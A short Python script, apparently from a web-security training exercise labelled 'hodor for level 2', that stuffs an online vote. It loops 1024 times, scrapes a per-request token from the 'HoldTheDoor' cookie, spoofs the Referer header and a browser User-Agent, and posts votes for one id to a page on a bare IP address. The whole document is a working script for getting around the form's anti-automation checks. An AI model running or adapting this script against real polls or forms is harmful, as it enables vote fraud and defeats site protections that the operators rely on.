#!/usr/bin/python3
 
 
"""hodor for level 2"""
import requests

page = "http://158.69.76.135/level2.php"

header = {
	"referer": page,
	"User-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
}

for i in range(0, 1024):
	get = requests.get(page)
	cookies = get.cookies
	dictionary = cookies.get_dict()
	key = dictionary.get('HoldTheDoor')
	payloader = {'id': '2780', 'key': key, 'holdthedoor': 'Enviar'}
	result = requests.post(page, headers=header, data=payloader, cookies = cookies)
	print("Vote n*{:d} send it with code {}".format(i, result, key))
